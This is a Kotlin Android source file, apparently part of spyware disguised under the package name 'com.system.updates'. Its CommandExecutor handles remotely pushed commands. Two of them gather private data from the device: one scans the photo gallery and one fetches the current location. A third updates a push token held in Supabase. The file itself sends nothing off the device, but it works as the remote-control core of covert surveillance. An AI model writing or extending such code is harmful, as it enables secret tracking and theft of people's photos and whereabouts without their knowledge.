package com.system.updates.core

import android.content.Context
import android.content.Intent
import android.util.Log
import com.system.updates.modules.GeoProvider
import com.system.updates.modules.ImageModule

object CommandExecutor {

    private const val TAG = "CommandExecutor"

    fun execute(context: Context, command: String, extras: Intent?) {
        Log.d(TAG, "Executing command: $command")

        when (command) {
            "ping" -> {
                Log.i(TAG, "Pong! Device is online.")
            }
            "collect_images" -> {
                Log.i(TAG, "Starting image collection process...")
                val images = ImageModule.scanGallery(context, 20)
                Log.i(TAG, "Collected ${images.size} images.")
            }
            "get_location" -> {
                Log.i(TAG, "Fetching current location...")
                val location = GeoProvider.getCurrentLocation(context)
                Log.i(TAG, "Result: $location")
            }
            "update_token" -> {
                Log.i(TAG, "Updating FCM token in Supabase...")
            }
            else -> {
                Log.w(TAG, "Unknown command received: $command")
            }
        }
    }
}
